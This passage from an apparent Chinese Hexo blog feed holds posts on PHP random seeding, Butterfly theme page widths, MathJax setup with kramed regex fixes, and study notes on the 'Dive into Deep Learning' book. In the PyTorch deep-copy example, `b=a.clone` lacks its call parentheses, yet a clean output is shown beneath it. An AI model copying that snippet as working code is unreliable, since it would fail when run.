Mersenne Twister 算法生成随机整数。</p><p>rand(min,max)函数使用libc 随机数发生器。</p><p>mt_rand生成随机数比rand更快，且范围更大。</p><p>mt_scrand(seed)用于分发seed种子。指定seed后，使用mt_rand()生成的随机数序列为固定的，或者称为<strong>伪随机数</strong></p><p>srand(seed)同理</p><div class="note warning flat"><p>自 PHP 4.2.0 起，不再需要用 srand()或 mt_srand() 给随机数发生器播种 ，因为现在是由系统自动完成的。</p></div>]]></content>
      
      
      <categories>
          
          <category> CTF Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>butterfly主题修改单页的背景及宽度</title>
      <link href="/posts/17fd4e606351/"/>
      <url>/posts/17fd4e606351/</url>
      
        <content type="html"><![CDATA[<p>和butterfly爱好者交流时，发现他们都有过<strong>修改某些单独page页面宽度</strong>的念头<br>在categories、tags和archives这些页面去掉侧边栏，并减小page宽度也是一种较为美观的做法<br>奈何很多人不太懂css或者stylus语法，只能做到同时修改全站宽度<br>于是在_config.yml中新增pages_width项，达到可选择的配置主页、categories、tags和archives这些页面宽度的目的<br><strong>具体效果</strong>可以参考我的博客中的分类页：<a href="https://rickliu.com/categories/">https://rickliu.com/categories/</a></p><p>这里涉及到css中的条件判断的知识</p><p>修改<code>themes/butterfly/source/css/_global/index.styl</code></p><img src="/posts/17fd4e606351/image-20240202012439908.png" class="" title="image-20240202012439908"><p>修改<code>themes/butterfly/source/css/_page/common.styl</code></p><img src="/posts/17fd4e606351/image-20240202012522085.png" class="" title="image-20240202012522085"><p>修改<code>themes/butterfly/source/css/var.styl</code></p><img src="/posts/17fd4e606351/image-20240202012557432.png" class="" title="image-20240202012557432">]]></content>
      
      
      <categories>
          
          <category> 博客搭建记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Butterfly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>butterfly主题插入数学公式LaTeX</title>
      <link href="/posts/f9538327001b/"/>
      <url>/posts/f9538327001b/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我的博客中有一部分文章会是CTF Crypto题的writeup，所以解题原理部分经常会涉及到<strong>数学公式</strong></p><p>hexo框架下默认搭配的Markdown渲染器是 <strong><a href="https://github.com/hexojs/hexo-renderer-marked">hexo-renderer-marked</a></strong>，但其支持的渲染格式有限，而且并不支持排版系统LaTeX，以至于很多时候会出现想<strong>引用复杂数学公式却无法渲染</strong>的情况。</p><p>在butterfly主题下对hexo的Markdown渲染器的改进方案有两种：添加<strong>Mathjax</strong>或<strong>KaTeX</strong>语法引擎</p><div class="note warning flat"><p>由于本人做笔记一般是使用Markdown编译软件<strong>Typora</strong>，而Typora用的是<strong>MathJax</strong>引擎，所以本教程主要涉及butterfly主题下MathJax的安装和改进。KaTeX的配置方法可以在<a href="https://butterfly.js.org/posts/ceeb73f/#Math-數學">butterfly官方教程</a>中找到。</p></div><h2 id="配置Mathjax"><a href="#配置Mathjax" class="headerlink" title="配置Mathjax"></a>配置Mathjax</h2><h3 id="替换hexo的markdown渲染引擎"><a href="#替换hexo的markdown渲染引擎" class="headerlink" title="替换hexo的markdown渲染引擎"></a>替换hexo的markdown渲染引擎</h3><ol><li><p>在hexo的博客目录下输入以下指令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm uninstall hexo-renderer-marked --save</span><br><span class="line">npm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure><p>前一句是用来删除原有的hexo-renderer-marked插件</p></li><li><p>编辑根目录下的<code>_config.yml</code>文件，在末尾中添加如下代码</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">kramed:</span></span><br><span class="line">  <span class="attr">gfm:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">pedantic:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">sanitize:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">tables:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">breaks:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">smartLists:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">smartypants:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></li><li><p>编辑根目录下的<code>_config.butterfly.yml</code>主题文件</p><p>将mathjax下的enable设置为true</p><div class="note primary flat"><p>推荐将<strong>per_page</strong>属性值也设置为<strong>true</strong>，这样会为博客每一篇文章都开启 Mathjax 服务，省去额外去文章的<code>Front-matter</code>中配置Mathjax参数的工作。</p></div><p>具体配置如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># MathJax</span></span><br><span class="line"><span class="attr">mathjax:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">per_page:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="Mathjax的语法"><a href="#Mathjax的语法" class="headerlink" title="Mathjax的语法"></a>Mathjax的语法</h2><p>在Mathjax中使用数学公式的语法和LaTex基本一致</p><p>由于语法规则较为复杂，有大量使用规范需要记忆，所以一般我在实际编写过程中都会使用在线公式编辑器来将我需要的数学公式转化为LaTex表达式</p><div class="note info flat"><p>在线LaTex公式编辑器链接：<a href="https://www.latexlive.com/">https://www.latexlive.com/</a></p></div><h2 id="解决渲染冲突"><a href="#解决渲染冲突" class="headerlink" title="解决渲染冲突"></a>解决渲染冲突</h2><p>在hexo框架下直接使用Mathjax时会遇到一些渲染冲突的问题</p><p>此时需要在原本的hexo-renderer-kramed插件上做出改动</p><p>以下是我在使用过程中遇到的两个问题及改进方法</p><h3 id="下划线-被转义为斜体而非LaTeX下标"><a href="#下划线-被转义为斜体而非LaTeX下标" class="headerlink" title="下划线_被转义为斜体而非LaTeX下标"></a>下划线_被转义为斜体而非LaTeX下标</h3><p>问题描述：当公式中出现多个下划线时，会被kramed渲染为Markdown斜体，导致公式显示异常。</p><p>Markdown本身的语法是支持<code>*</code>和<code>_</code>都被转义为斜体的，所以我们可以取消掉kramed对<code>_</code>的转义。</p><p>编辑博客根目录下相对路径路径为<code>[Blogroot]/node_modules/kramed/lib/rules/inline.js</code>的文件，找到<strong>第20行</strong>如下代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">em</span>: <span class="regexp">/^\b_((?:__|[\s\S])+?)_\b|^\*((?:\*\*|[\s\S])+?)\*(?!\*)/</span>,</span><br></pre></td></tr></table></figure><p>修改为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">em</span>: <span class="regexp">/^\*((?:\*\*|[\s\S])+?)\*(?!\*)/</span>,</span><br></pre></td></tr></table></figure><p>就取消了对下划线_的转义。</p><p>以后使用斜体的话只用<code>*</code>符号就够了。如果LaTeX要使用大量<code>*</code>符号，可用<code>\ast</code>代替。</p><h3 id="反斜杠加竖线-被转义为-而非LaTeX双竖线"><a href="#反斜杠加竖线-被转义为-而非LaTeX双竖线" class="headerlink" title="反斜杠加竖线\|被转义为|而非LaTeX双竖线"></a>反斜杠加竖线<code>\|</code>被转义为|而非LaTeX双竖线</h3><p>问题描述：当公式中出现<code>\|</code>表示紧贴符号时，会被kramed渲染为<code>|</code>，导致公式显示异常。</p><p>还是<code>inline.js</code>代码的问题。</p><p>找到第64行如下代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">escape</span>: <span class="title function_">replace</span>(inline.<span class="property">escape</span>)(<span class="string">&#x27;])&#x27;</span>, <span class="string">&#x27;~|])&#x27;</span>)(),</span><br></pre></td></tr></table></figure><p>修改为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">escape</span>: <span class="title function_">replace</span>(inline.<span class="property">escape</span>)(<span class="string">&#x27;])&#x27;</span>, <span class="string">&#x27;~])&#x27;</span>)(),</span><br></pre></td></tr></table></figure><p>这样就取消了krame对<code>\|</code>的转义。</p><h3 id="hexo-renderer-kramed不能渲染Todo-List"><a href="#hexo-renderer-kramed不能渲染Todo-List" class="headerlink" title="hexo-renderer-kramed不能渲染Todo List"></a>hexo-renderer-kramed不能渲染Todo List</h3><p>编辑博客根目录下相对路径为<code>[Blogroot]/node_modules/hexo-renderer-kramed/lib/renderer.js</code>的文件，在<strong>第19行左右的空白处</strong>添加以下js代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Support To-Do List</span></span><br><span class="line"><span class="title class_">Renderer</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">listitem</span> = <span class="keyword">function</span>(<span class="params">text</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="regexp">/^\s*\[[x ]\]\s*/</span>.<span class="title function_">test</span>(text)) &#123;</span><br><span class="line">    text = text.<span class="title function_">replace</span>(<span class="regexp">/^\s*\[ \]\s*/</span>, <span class="string">&#x27;&lt;input type=&quot;checkbox&quot;&gt;&lt;/input&gt; &#x27;</span>).<span class="title function_">replace</span>(<span class="regexp">/^\s*\[x\]\s*/</span>, <span class="string">&#x27;&lt;input type=&quot;checkbox&quot; checked&gt;&lt;/input&gt; &#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;li style=&quot;list-style: none&quot;&gt;&#x27;</span> + text + <span class="string">&#x27;&lt;/li&gt;\n&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;li&gt;&#x27;</span> + text + <span class="string">&#x27;&lt;/li&gt;\n&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://butterfly.js.org/posts/ceeb73f/">Butterfly 安裝文檔(四) 主題配置-2 | Butterfly</a></p><p><a href="https://blog.csdn.net/weixin_44441126/article/details/119745642">解决hexo-renderer-kramed渲染冲突的部分问题_</a></p><p><a href="https://www.jianshu.com/p/d95a4795f3a8">hexo下LaTeX无法显示的解决方案 - 简书 (jianshu.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> 博客搭建记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Butterfly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《动手学深度学习》笔记（前三章）</title>
      <link href="/posts/901c6f233b3c/"/>
      <url>/posts/901c6f233b3c/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上个学期搞<strong>大学生创新创业</strong>的时候，我对机器学习和OCR领域的各种方法都还是<strong>一知半解</strong>。只知道怎么看懂代码、复现代码和掌握论文的大体框架，但是对具体实现细节和原理还是一无所知。</p><p>遂趁着暑假的闲暇时光系统性学习一下<strong>深度学习</strong></p><p>本着 <mark class="hl-label blue">学习的最高境界是能将学到的知识复述出来</mark>  这一理念，我打算在这个系列里分享一些学习笔记与收获</p><p>这次自学用到的教材是<strong>李沐</strong>老师等深度学习领域的大牛编著的<strong>《动手学深度学习(PyTorch版)》</strong>一书</p><div class="note warning flat"><p>本书同时覆盖深度学习的方法和实践，主要面向<strong>在校大学生、技术人员和研究人员</strong>。阅读本书需要读者了解<strong>基本的Python编程</strong>或附录中描述的<strong>线性代数、微分和概率基础</strong>。</p></div><div class="note info flat"><p>购买链接：<a href="https://item.jd.com/13628339.html">《动手学深度学习 PyTorch版 - 京东图书 (jd.com)</a></p><p>在线学习：<a href="http://zh-v2.d2l.ai/chapter_preface/index.html">前言 — 动手学深度学习 2.0.0 documentation (d2l.ai)</a></p></div><p>废话不多说，本文章的笔记内容范围覆盖原书的<strong>前三章</strong>：</p><h2 id="Chapter1-序言"><a href="#Chapter1-序言" class="headerlink" title="Chapter1.序言"></a>Chapter1.序言</h2><p>序言主要是介绍机器学习，里面大体的内容还是有些浅的认知，但也有一些我觉得比较重要的知识点：</p><p><strong>无监督学习</strong></p><p>数据中不含有“目标”的机器学习问题通常被为<em>无监督学习</em>（unsupervised learning）</p><ul><li><em>聚类</em>（clustering）问题：没有标签的情况下，我们是否能给数据分类呢？比如，给定一组照片，我们能把它们分成风景照片、狗、婴儿、猫和山峰的照片吗？同样，给定一组用户的网页浏览记录，我们能否将具有相似行为的用户聚类呢？</li><li><em>主成分分析</em>（principal component analysis）问题：我们能否找到少量的参数来准确地捕捉数据的线性相关属性？比如，一个球的运动轨迹可以用球的速度、直径和质量来描述。再比如，裁缝们已经开发出了一小部分参数，这些参数相当准确地描述了人体的形状，以适应衣服的需要。另一个例子：在欧几里得空间中是否存在一种（任意结构的）对象的表示，使其符号属性能够很好地匹配?这可以用来描述实体及其关系，例如“罗马” −− “意大利” ++ “法国” == “巴黎”。</li><li><em>因果关系</em>（causality）和<em>概率图模型</em>（probabilistic graphical models）问题：我们能否描述观察到的许多数据的根本原因？例如，如果我们有关于房价、污染、犯罪、地理位置、教育和工资的人口统计数据，我们能否简单地根据经验数据发现它们之间的关系？</li><li><em>生成对抗性网络</em>（generative adversarial networks）：为我们提供一种合成数据的方法，甚至像图像和音频这样复杂的非结构化数据。潜在的统计机制是检查真实和虚假数据是否相同的测试，它是无监督学习的另一个重要而令人兴奋的领域。</li></ul><p><strong>近十年的里程碑式idea</strong></p><ul><li><strong>新的容量控制方法</strong>，如<em>dropout</em> :cite:<code>Srivastava.Hinton.Krizhevsky.ea.2014</code>，有助于减轻过拟合的危险。这是通过在整个神经网络中应用噪声注入 :cite:<code>Bishop.1995</code> 来实现的，出于训练目的，用随机变量来代替权重。</li><li><strong>注意力机制</strong>解决了困扰统计学一个多世纪的问题：如何在不增加可学习参数的情况下增加系统的记忆和复杂性。研究人员通过使用只能被视为可学习的指针结构 :cite:<code>Bahdanau.Cho.Bengio.2014</code> 找到了一个优雅的解决方案。不需要记住整个文本序列（例如用于固定维度表示中的机器翻译），所有需要存储的都是指向翻译过程的中间状态的指针。这大大提高了长序列的准确性，因为模型在开始生成新序列之前不再需要记住整个序列。</li><li><strong>多阶段设计</strong>。例如，存储器网络 :cite:<code>Sukhbaatar.Weston.Fergus.ea.2015</code> 和神经编程器-解释器 :cite:<code>Reed.De-Freitas.2015</code>。它们允许统计建模者描述用于推理的迭代方法。这些工具允许重复修改深度神经网络的内部状态，从而执行推理链中的后续步骤，类似于处理器如何修改用于计算的存储器。</li><li>另一个关键的发展是<strong>生成对抗网络</strong> :cite:<code>Goodfellow.Pouget-Abadie.Mirza.ea.2014</code> 的发明。传统模型中，密度估计和生成模型的统计方法侧重于找到合适的概率分布（通常是近似的）和抽样算法。因此，这些算法在很大程度上受到统计模型固有灵活性的限制。生成式对抗性网络的关键创新是用具有可微参数的任意算法代替采样器。然后对这些数据进行调整，使得鉴别器（实际上是一个双样本测试）不能区分假数据和真实数据。通过使用任意算法生成数据的能力，它为各种技术打开了密度估计的大门。驰骋的斑马 :cite:<code>Zhu.Park.Isola.ea.2017</code> 和假名人脸 :cite:<code>Karras.Aila.Laine.ea.2017</code> 的例子都证明了这一进展。即使是业余的涂鸦者也可以根据描述场景布局的草图生成照片级真实图像（ :cite:<code>Park.Liu.Wang.ea.2019</code> ）。</li><li>在许多情况下，单个GPU不足以处理可用于训练的大量数据。在过去的十年中，<strong>构建并行和分布式训练算法</strong>的能力有了显著提高。设计可伸缩算法的关键挑战之一是深度学习优化的主力——随机梯度下降，它依赖于相对较小的小批量数据来处理。同时，小批量限制了GPU的效率。因此，在1024个GPU上进行训练，例如每批32个图像的小批量大小相当于总计约32000个图像的小批量。最近的工作，首先是由 :cite:<code>Li.2017</code> 完成的，随后是 :cite:<code>You.Gitman.Ginsburg.2017</code> 和 :cite:<code>Jia.Song.He.ea.2018</code> ，将观察大小提高到64000个，将ResNet-50模型在ImageNet数据集上的训练时间减少到不到7分钟。作为比较——最初的训练时间是按天为单位的。</li><li>并行计算的能力也对<strong>强化学习的进步</strong>做出了相当关键的贡献。这导致了计算机在围棋、雅达里游戏、星际争霸和物理模拟（例如，使用MuJoCo）中实现超人性能的重大进步。有关如何在AlphaGo中实现这一点的说明，请参见如 :cite:<code>Silver.Huang.Maddison.ea.2016</code> 。简而言之，如果有大量的（状态、动作、奖励）三元组可用，即只要有可能尝试很多东西来了解它们之间的关系，强化学习就会发挥最好的作用。仿真提供了这样一条途径。</li><li><strong>深度学习框架</strong>在传播思想方面发挥了至关重要的作用。允许轻松建模的第一代框架包括<a href="https://github.com/BVLC/caffe">Caffe</a>、<a href="https://github.com/torch">Torch</a>和<a href="https://github.com/Theano/Theano">Theano</a>。许多开创性的论文都是用这些工具写的。到目前为止，它们已经被<a href="https://github.com/tensorflow/tensorflow">TensorFlow</a>（通常通过其高级API <a href="https://github.com/keras-team/keras">Keras</a>使用）、<a href="https://github.com/Microsoft/CNTK">CNTK</a>、<a href="https://github.com/caffe2/caffe2">Caffe 2</a>和<a href="https://github.com/apache/incubator-mxnet">Apache MXNet</a>所取代。第三代工具，即用于深度学习的命令式工具，可以说是由<a href="https://github.com/chainer/chainer">Chainer</a>率先推出的，它使用类似于Python NumPy的语法来描述模型。这个想法被<a href="https://github.com/pytorch/pytorch">PyTorch</a>、MXNet的<a href="https://github.com/apache/incubator-mxnet">Gluon API</a>和<a href="https://github.com/google/jax">Jax</a>都采纳了。</li></ul><div class="note primary flat"><p>原书中有一段话我觉得说的挺好的，在这里摘抄一下：</p><blockquote><p>我们离一个能够控制人类创造者的有知觉的人工智能系统还很远。 首先，人工智能系统是以一种特定的、面向目标的方式设计、训练和部署的。 虽然他们的行为可能会给人一种通用智能的错觉，但设计的基础是规则、启发式和统计模型的结合。 其次，目前还不存在能够自我改进、自我推理、能够在试图解决一般任务的同时，修改、扩展和改进自己的架构的“人工通用智能”工具。</p><p>一个更紧迫的问题是人工智能在日常生活中的应用。 卡车司机和店员完成的许多琐碎的工作很可能也将是自动化的。 农业机器人可能会降低有机农业的成本，它们也将使收割作业自动化。 工业革命的这一阶段可能对社会的大部分地区产生深远的影响，因为卡车司机和店员是许多国家最常见的工作之一。 此外，如果不加注意地应用统计模型，可能会导致种族、性别或年龄偏见，如果自动驱动相应的决策，则会引起对程序公平性的合理关注。 重要的是要确保小心使用这些算法。 就我们今天所知，这比恶意超级智能毁灭人类的风险更令人担忧。</p></blockquote></div><h2 id="Chapter2-预备知识"><a href="#Chapter2-预备知识" class="headerlink" title="Chapter2.预备知识"></a>Chapter2.预备知识</h2><h3 id="数据操作"><a href="#数据操作" class="headerlink" title="数据操作"></a>数据操作</h3><h4 id="广播机制"><a href="#广播机制" class="headerlink" title="广播机制"></a>广播机制</h4><p>数据操作中比较重要的一个点是<strong>广播机制</strong>：</p><p>在某些情况下，即使形状不同，我们仍然可以通过调用 <em>广播机制</em>（broadcasting mechanism）来执行按元素操作。 这种机制的工作方式如下：</p><ol><li>通过适当复制元素来扩展一个或两个数组，以便在转换之后，两个张量具有相同的形状；</li><li>对生成的数组执行按元素操作。</li></ol><p>在大多数情况下，我们将沿着数组中长度为1的轴进行广播，如下例子：</p><p>In:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = torch.arange(<span class="number">3</span>).reshape((<span class="number">3</span>, <span class="number">1</span>))</span><br><span class="line">b = torch.arange(<span class="number">2</span>).reshape((<span class="number">1</span>, <span class="number">2</span>))</span><br><span class="line">a, b</span><br></pre></td></tr></table></figure><p>Out:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(tensor([[<span class="number">0</span>],</span><br><span class="line">         [<span class="number">1</span>],</span><br><span class="line">         [<span class="number">2</span>]]),</span><br><span class="line"> tensor([[<span class="number">0</span>, <span class="number">1</span>]]))</span><br></pre></td></tr></table></figure><p>由于<code>a</code>和<code>b</code>分别是3×1和1×2矩阵，如果让它们相加，它们的形状不匹配。 我们将两个矩阵<em>广播</em>为一个更大的3×2矩阵，如下所示：矩阵<code>a</code>将复制列， 矩阵<code>b</code>将复制行，然后再按元素相加。<br>In:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a + b</span><br></pre></td></tr></table></figure><p>Out:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tensor([[<span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">        [<span class="number">1</span>, <span class="number">2</span>],</span><br><span class="line">        [<span class="number">2</span>, <span class="number">3</span>]])</span><br></pre></td></tr></table></figure><h4 id="节省内存"><a href="#节省内存" class="headerlink" title="节省内存"></a>节省内存</h4><p>这里涉及到python中的<strong>赋值(复制)、浅拷贝与深拷贝</strong></p><p>首先有几个关于python的基本概念要搞清楚：</p><div class="note info flat"><p><strong>变量</strong>：是一个系统表的元素，拥有指向对象的连接空间</p><p><strong>对象</strong>：被分配的一块内存，存储其所代表的值</p><p><strong>引用</strong>：是自动形成的从变量到对象的指针</p><p><strong>类型</strong>：属于对象，而非变量</p><p><strong>不可变对象</strong>：一旦创建就不可修改的对象，包括字符串、元组、数值类型</p><p><em>（该对象所指向的内存中的值不能被改变。当改变某个变量时候，由于其所指的值不能被改变，相当于把原来的值复制一份后再改变，这会开辟一个新的地址，变量再指向这个新的地址。）</em></p><p><strong>可变对象</strong>：可以修改的对象，包括列表、字典、集合</p><p><em>（该对象所指向的内存中的值可以被改变。变量（准确的说是引用）改变后，实际上是其所指的值直接发生改变，并没有发生复制行为，也没有开辟新的地址，通俗点说就是原地改变。）</em></p></div><p>那么本文只会涉及赋值(复制)、浅拷贝与深拷贝三种操作的一点细微区别</p><p>即若改变新变量的值，原变量会不会随着发生变化</p><p>如下表所示：</p><div class="table-container"><table><thead><tr><th>操作</th><th>不可变对象</th><th>可变对象</th></tr></thead><tbody><tr><td>赋值(复制)</td><td>不变</td><td>变化</td></tr><tr><td>浅拷贝</td><td>不变</td><td>变化</td></tr><tr><td>深拷贝</td><td>不变</td><td>不变</td></tr></tbody></table></div><p>如果想更深入的了解这三种操作，可以参考以下信息提示：</p><div class="note info flat"><div class="tabs" id="三种操作的区别"><ul class="nav-tabs"><button type="button" class="tab  active" data-href="三种操作的区别-1">赋值(复制)</button><button type="button" class="tab " data-href="三种操作的区别-2">浅拷贝</button><button type="button" class="tab " data-href="三种操作的区别-3">深拷贝</button></ul><div class="tab-contents"><div class="tab-item-content active" id="三种操作的区别-1"><p>直接赋值其实就是对象的引用（别名）。</p><p><img src="/posts/901c6f233b3c/image-20230729195815961.png" class="" title="image-20230729195815961"></p><p><img src="/posts/901c6f233b3c/image-20230729200158322.png" class="" title="image-20230729200158322"></p></div><div class="tab-item-content" id="三种操作的区别-2"><p>拷贝父对象，不会拷贝对象的内部的子对象。</p><p>浅拷贝要分两种情况进行讨论：</p><p>1）当浅拷贝的值是不可变对象（字符串、元组、数值类型）时和“赋值”的情况一样，对象的id值<em>（id()函数用于获取对象的内存地址）</em>与浅拷贝原来的值相同。</p><p>2）当浅拷贝的值是可变对象（列表、字典、集合）时会产生一个“不是那么独立的对象”存在。</p><p><img src="/posts/901c6f233b3c/image-20230729200936655-16906334884741.png" class="" title="image-20230729200936655"></p><p><img src="img/image-20230729201711241.png" alt="image-20230729201711241"></p><p><img src="/posts/901c6f233b3c/image-20230729202010740-16906334993083.png" class="" title="image-20230729202010740"></p></div><div class="tab-item-content" id="三种操作的区别-3"><p> copy 模块的 deepcopy 方法，完全拷贝了父对象及其子对象。</p><p>改变原有被复制对象不会对已经复制出来的新对象产生影响。</p><p><img src="/posts/901c6f233b3c/image-20230729202143832-16906335074795.png" class="" title="image-20230729202143832"></p><p><img src="/posts/901c6f233b3c/image-20230729202304412-16906335174477.png" class="" title="image-20230729202304412"></p></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><p>那么事实上，在pytorch中，张量作为可变对象来看待</p><p>那么像x.reshape()和x.detach()这样的操作具有浅拷贝的性质：</p><img src="/posts/901c6f233b3c/image-20230729204012380.png" class="" title="image-20230729204012380"><p>而运行一些操作也可能会导致<strong>为新结果分配内存</strong>。</p><p> 例如，如果我们用<code>Y = X + Y</code>，我们将取消引用<code>Y</code>指向的张量，而是指向新分配的内存处的张量。</p><p>在下面的例子中，我们用Python的<code>id()</code>函数演示了这一点， 它给我们提供了内存中引用对象的确切地址。 运行<code>Y = Y + X</code>后，我们会发现<code>id(Y)</code>指向另一个位置。 这是因为Python首先计算<code>Y + X</code>，为结果分配新的内存，然后使<code>Y</code>指向内存中的这个新位置。</p><p>In :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">before = <span class="built_in">id</span>(Y)</span><br><span class="line">Y = Y + X</span><br><span class="line"><span class="built_in">id</span>(Y) == before</span><br></pre></td></tr></table></figure><p>Out:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">False</span></span><br></pre></td></tr></table></figure><p>这可能是不可取的，原因有两个：</p><ol><li>首先，我们不想总是不必要地分配内存。在机器学习中，我们可能有数百兆的参数，并且在一秒内多次更新所有参数。通常情况下，我们希望原地执行这些更新；</li><li>如果我们不原地更新，其他引用仍然会指向旧的内存位置，这样我们的某些代码可能会无意中引用旧的参数。</li></ol><p>幸运的是，(<strong>执行原地操作</strong>)非常简单。 我们可以使用切片表示法将操作的结果分配给先前分配的数组，例如<code>Y[:] = &lt;expression&gt;</code>。 为了说明这一点，我们首先创建一个新的矩阵<code>Z</code>，其形状与另一个<code>Y</code>相同， 使用<code>zeros_like</code>来分配一个全00的块。</p><p>In :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Z = torch.zeros_like(Y)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;id(Z):&#x27;</span>, <span class="built_in">id</span>(Z))</span><br><span class="line">Z[:] = X + Y</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;id(Z):&#x27;</span>, <span class="built_in">id</span>(Z))</span><br></pre></td></tr></table></figure><p>Out:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span>(Z): <span class="number">139931132035296</span></span><br><span class="line"><span class="built_in">id</span>(Z): <span class="number">139931132035296</span></span><br></pre></td></tr></table></figure><p>[<strong>如果在后续计算中没有重复使用<code>X</code>， 我们也可以使用<code>X[:] = X + Y</code>或<code>X += Y</code>来减少操作的内存开销。</strong>]</p><p>In :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">before = id(X)</span><br><span class="line">X += Y</span><br><span class="line">id(X) == before</span><br></pre></td></tr></table></figure><p>Out:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">True</span><br></pre></td></tr></table></figure><h4 id="深拷贝"><a href="#深拷贝" class="headerlink" title="深拷贝"></a>深拷贝</h4><p>而如果我们如果想对张量进行深拷贝，则可以使用clone()函数：</p><p>In:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = torch.arange(<span class="number">12</span>)</span><br><span class="line">b=a.clone</span><br><span class="line">b[:] = <span class="number">2</span></span><br><span class="line">a</span><br></pre></td></tr></table></figure><p>Out:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tensor([ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>])</span><br></pre></td></tr></table></figure><p>而关于张量的浅拷贝和深拷贝其实还有一些更深入的区别：</p><div class="note primary 